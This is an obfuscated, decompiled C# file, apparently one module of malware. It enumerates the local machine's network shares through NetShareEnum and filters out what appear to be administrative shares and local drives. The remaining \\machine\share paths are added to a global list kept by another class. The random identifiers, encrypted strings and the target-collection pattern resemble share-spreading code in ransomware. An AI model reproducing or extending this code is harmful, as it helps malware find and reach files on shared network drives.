using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wDtIYaxdpawEu;

public sealed class YCyShzHVIaHvgb
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct OMuMlfKMsBkdHYDb
	{
		public string SFVidpUhIZeRMhuJ;

		public uint CRlQKXsyyDnHlM;

		public string NmHEAvFjOBY;

		public OMuMlfKMsBkdHYDb(string string_0, uint uint_0, string string_1)
		{
			SFVidpUhIZeRMhuJ = string_0;
			CRlQKXsyyDnHlM = uint_0;
			NmHEAvFjOBY = string_1;
		}

		public override string ToString()
		{
			return SFVidpUhIZeRMhuJ;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	public OMuMlfKMsBkdHYDb[] lXZcAFxaDSAq(string string_0)
	{
		List<OMuMlfKMsBkdHYDb> list = new List<OMuMlfKMsBkdHYDb>();
		int int_ = 0;
		int int_2 = 0;
		int int_3 = 0;
		int num = Marshal.SizeOf(typeof(OMuMlfKMsBkdHYDb));
		IntPtr intptr_ = IntPtr.Zero;
		StringBuilder stringBuilder_ = new StringBuilder(string_0);
		int num2 = NetShareEnum(stringBuilder_, 1, ref intptr_, uint.MaxValue, ref int_, ref int_2, ref int_3);
		if (num2 == 0)
		{
			IntPtr ptr = intptr_;
			for (int i = 0; i < int_; i++)
			{
				OMuMlfKMsBkdHYDb item = (OMuMlfKMsBkdHYDb)Marshal.PtrToStructure(ptr, typeof(OMuMlfKMsBkdHYDb));
				list.Add(item);
				ptr += num;
			}
			NetApiBufferFree(intptr_);
			return list.ToArray();
		}
		list.Add(new OMuMlfKMsBkdHYDb(getString_0(107376582) + num2, 10u, string.Empty));
		return list.ToArray();
	}

	[DllImport("Netapi32.dll", SetLastError = true)]
	private static extern int NetApiBufferFree(IntPtr intptr_0);

	[DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
	private static extern int NetShareEnum(StringBuilder stringBuilder_0, int int_0, ref IntPtr intptr_0, uint uint_0, ref int int_1, ref int int_2, ref int int_3);

	public static void pWRyLCvaJsD()
	{
		try
		{
			string[] logicalDrives = Directory.GetLogicalDrives();
			OMuMlfKMsBkdHYDb[] array = new YCyShzHVIaHvgb().lXZcAFxaDSAq(Environment.MachineName);
			OMuMlfKMsBkdHYDb[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				OMuMlfKMsBkdHYDb oMuMlfKMsBkdHYDb = array2[i];
				if (oMuMlfKMsBkdHYDb.ToString().Contains(getString_0(107375168)) || oMuMlfKMsBkdHYDb.ToString().Contains(getString_0(107375159)) || oMuMlfKMsBkdHYDb.ToString().Contains(getString_0(107375118)) || oMuMlfKMsBkdHYDb.ToString().Contains(getString_0(107400521)) || logicalDrives.Contains(oMuMlfKMsBkdHYDb.ToString().Replace(getString_0(107349719), getString_0(107375109))))
				{
					continue;
				}
				if (!OwCGWssNrah.uneznyCLJqjxYvh.Contains(getString_0(107400572) + Environment.MachineName + getString_0(107396980) + oMuMlfKMsBkdHYDb))
				{
					OwCGWssNrah.uneznyCLJqjxYvh.Add(getString_0(107400572) + Environment.MachineName + getString_0(107396980) + oMuMlfKMsBkdHYDb);
				}
				if (OwCGWssNrah.RxwgNpmsCUXw)
				{
					try
					{
						Console.WriteLine(getString_0(107375136), getString_0(107400572) + Environment.MachineName + getString_0(107396980) + oMuMlfKMsBkdHYDb);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (OwCGWssNrah.SBPYnaSzKyFP)
			{
				try
				{
					File.AppendAllText(OwCGWssNrah.ndioqUCcjeEwRygxn, getString_0(107375079) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static YCyShzHVIaHvgb()
	{
		Strings.CreateGetStringDelegate(typeof(YCyShzHVIaHvgb));
	}
}
